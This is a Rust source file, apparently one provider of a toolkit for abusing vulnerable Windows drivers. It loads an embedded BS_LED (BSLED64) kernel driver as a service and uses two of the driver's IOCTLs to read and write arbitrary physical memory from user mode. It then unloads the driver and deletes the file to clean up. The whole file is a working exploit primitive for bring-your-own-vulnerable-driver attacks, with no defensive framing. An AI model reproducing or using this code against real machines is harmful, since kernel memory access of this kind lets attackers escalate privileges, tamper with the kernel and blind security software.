use std::{ffi::c_void, fs, ptr, thread, time::Duration};

use vdem::{provider::Provider, service::DriverService, utils};
use windows::{
    Win32::{
        Foundation::HANDLE,
        Storage::FileSystem::{
            CreateFileW, FILE_ALL_ACCESS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_NONE, OPEN_EXISTING,
        },
        System::IO::DeviceIoControl,
    },
    core::{Owned, PCWSTR},
};

use crate::bin::BSLED64_SYS;

use anyhow::{Result, anyhow};

const IOCTL_READ_PHYSICAL_MEMORY: u32 = 0x226040;
const IOCTL_WRITE_PHYSICAL_MEMORY: u32 = 0x226044;

#[repr(C, packed(1))]
#[derive(Debug, Default)]
struct ReadMemoryRequest {
    physical_address: u32,
}

#[repr(C, packed(1))]
#[derive(Debug, Default)]
struct WriteMemoryRequest {
    physical_address: u32,
}

#[derive(Default)]
pub struct BsLed64 {
    hdev: Owned<HANDLE>,
    service: DriverService,
}

impl BsLed64 {
    pub fn new() -> Self {
        Self::default()
    }
}

impl Provider for BsLed64 {
    fn name(&self) -> &str {
        "BS_LED"
    }

    fn install(&mut self) -> Result<()> {
        self.service = utils::create_vulndrv_service(&BSLED64_SYS)
            .map_err(|e| anyhow!("Create driver serivce failed {e}"))?;

        Ok(())
    }

    fn uninstall(&self) -> Result<()> {
        self.service.uninstall()?;

        // wait for the kernel to unmap the driver image and then we can safely delete the file
        while utils::is_file_in_use(self.service.bin_path()) {
            thread::sleep(Duration::from_millis(30));
        }

        fs::remove_file(self.service.bin_path())?;

        Ok(())
    }

    fn start(&mut self) -> Result<()> {
        self.service.start()?;

        let device_path_name = utils::str_to_wide(&("\\??\\".to_owned() + "BS_LED"));

        self.hdev = unsafe {
            Owned::new(CreateFileW(
                PCWSTR(device_path_name.as_ptr()),
                FILE_ALL_ACCESS.0,
                FILE_SHARE_NONE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )?)
        };

        Ok(())
    }

    fn stop(&mut self) -> Result<()> {
        self.hdev = Owned::default();

        self.service
            .stop()
            .map_err(|e| anyhow!("Can not stop driver service: {e}"))
    }

    fn can_do_pmio(&self) -> bool {
        true
    }

    fn pm_read(&self, phyaddr: *mut c_void, buffer: &mut [u8]) -> Result<usize> {
        let mut outlen: u32 = 0;

        let mut request = ReadMemoryRequest {
            physical_address: phyaddr as _,
        };

        unsafe {
            DeviceIoControl(
                self.hdev.to_owned(),
                IOCTL_READ_PHYSICAL_MEMORY,
                Some(&mut request as *mut _ as _),
                core::mem::size_of::<ReadMemoryRequest>() as _,
                Some(buffer.as_mut_ptr().cast()),
                buffer.len() as _,
                Some(&mut outlen),
                None,
            )?
        }

        Ok(buffer.len())
    }

    fn pm_write(&self, phyaddr: *mut c_void, buffer: &[u8]) -> Result<usize> {
        let mut outlen: u32 = 0;
        let buffer_length = core::mem::size_of::<WriteMemoryRequest>() + buffer.len();
        let mut local_buffer = vec![0u8; buffer_length];

        let request = local_buffer.as_mut_ptr().cast::<WriteMemoryRequest>();

        unsafe {
            (*request).physical_address = phyaddr as _;

            ptr::copy_nonoverlapping(
                buffer.as_ptr(),
                local_buffer
                    .as_mut_ptr()
                    .wrapping_add(core::mem::size_of::<u32>()),
                buffer.len(),
            );
        }

        unsafe {
            DeviceIoControl(
                self.hdev.to_owned(),
                IOCTL_WRITE_PHYSICAL_MEMORY,
                Some(request.cast()),
                buffer_length as _,
                None,
                0,
                Some(&mut outlen),
                None,
            )?
        }

        Ok(buffer.len())
    }
}

impl Drop for BsLed64 {
    fn drop(&mut self) {
        let _ = self.stop();
        let _ = self.uninstall();
    }
}
